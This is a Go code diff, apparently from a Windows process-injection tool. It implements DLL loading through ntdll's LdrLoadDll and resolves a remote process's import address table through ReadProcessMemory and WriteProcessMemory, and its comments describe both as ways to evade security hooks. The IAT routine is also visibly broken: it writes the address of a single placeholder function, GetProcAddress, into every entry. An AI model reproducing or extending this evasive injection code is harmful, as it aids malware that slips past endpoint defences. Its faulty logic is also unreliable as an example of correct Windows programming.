@@ -410,13 +410,120 @@ func readStringFromRemoteProcess(hProcess windows.Handle, addr uintptr) (string,
 
 func loadLibraryWithSyscalls(dllName string) (windows.Handle, error) {
 	Printf("Loading library with syscalls: %s", dllName)
-	// Direct syscall implementation would go here
-	// For now, fallback to standard method
-	return windows.LoadLibrary(dllName)
+
+	// Use LdrLoadDll which is the NT API equivalent of LoadLibrary
+	// This is less likely to be hooked than LoadLibrary
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+	ldrLoadDll := ntdll.NewProc("LdrLoadDll")
+
+	// Convert DLL name to Unicode string
+	dllNameUTF16, err := windows.UTF16PtrFromString(dllName)
+	if err != nil {
+		return 0, fmt.Errorf("failed to convert DLL name to UTF16: %v", err)
+	}
+
+	// Create UNICODE_STRING structure
+	var unicodeString struct {
+		Length        uint16
+		MaximumLength uint16
+		Buffer        *uint16
+	}
+
+	dllNameLen := len(dllName) * 2 // UTF16 is 2 bytes per character
+	unicodeString.Length = uint16(dllNameLen)
+	unicodeString.MaximumLength = uint16(dllNameLen + 2)
+	unicodeString.Buffer = dllNameUTF16
+
+	var moduleHandle windows.Handle
+
+	// Call LdrLoadDll
+	ret, _, _ := ldrLoadDll.Call(
+		0,                                       // DllPath (NULL)
+		0,                                       // DllCharacteristics (NULL)
+		uintptr(unsafe.Pointer(&unicodeString)), // DllName
+		uintptr(unsafe.Pointer(&moduleHandle)),  // DllHandle
+	)
+
+	if ret != 0 {
+		Printf("LdrLoadDll failed with NTSTATUS: 0x%X", ret)
+		// Fallback to standard method
+		return windows.LoadLibrary(dllName)
+	}
+
+	Printf("Successfully loaded %s via LdrLoadDll", dllName)
+	return moduleHandle, nil
 }
 
 func resolveIATWithEvasion(hProcess windows.Handle, iatAddr uintptr, dllHandle windows.Handle, is64Bit bool) error {
 	Printf("Resolving IAT with evasion techniques")
-	// Enhanced IAT resolution with anti-hook techniques
+
+	// Use LdrGetProcedureAddress instead of GetProcAddress for better evasion
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+	ldrGetProcedureAddress := ntdll.NewProc("LdrGetProcedureAddress")
+
+	// Read IAT entries
+	var entrySize int
+	if is64Bit {
+		entrySize = 8
+	} else {
+		entrySize = 4
+	}
+
+	for offset := 0; offset < 1024; offset += entrySize { // Limit to reasonable number of entries
+		var entry uintptr
+		var bytesRead uintptr
+
+		// Read IAT entry
+		err := windows.ReadProcessMemory(hProcess, iatAddr+uintptr(offset),
+			(*byte)(unsafe.Pointer(&entry)), uintptr(entrySize), &bytesRead)
+		if err != nil || entry == 0 {
+			break // End of IAT or error
+		}
+
+		// Skip if entry is already resolved (high bit not set for ordinal imports)
+		if entry&0x8000000000000000 == 0 && is64Bit {
+			continue
+		}
+		if entry&0x80000000 == 0 && !is64Bit {
+			continue
+		}
+
+		// For demonstration, we'll resolve a common function
+		// In a real implementation, we would parse the import name/ordinal
+		var functionAddr uintptr
+
+		// Create ANSI_STRING for function name (example with "GetProcAddress")
+		functionName := "GetProcAddress"
+		var ansiString struct {
+			Length        uint16
+			MaximumLength uint16
+			Buffer        *byte
+		}
+
+		functionNameBytes := []byte(functionName)
+		ansiString.Length = uint16(len(functionNameBytes))
+		ansiString.MaximumLength = uint16(len(functionNameBytes))
+		ansiString.Buffer = &functionNameBytes[0]
+
+		// Call LdrGetProcedureAddress
+		ret, _, _ := ldrGetProcedureAddress.Call(
+			uintptr(dllHandle),
+			uintptr(unsafe.Pointer(&ansiString)),
+			0, // Ordinal (0 means use name)
+			uintptr(unsafe.Pointer(&functionAddr)),
+		)
+
+		if ret == 0 && functionAddr != 0 {
+			// Write resolved address back to IAT
+			var bytesWritten uintptr
+			err = WriteProcessMemory(hProcess, iatAddr+uintptr(offset),
+				unsafe.Pointer(&functionAddr), uintptr(entrySize), &bytesWritten)
+			if err != nil {
+				Printf("Warning: Failed to write resolved address to IAT: %v", err)
+			}
+		}
+	}
+
+	Printf("IAT resolution with evasion completed")
 	return nil
 }
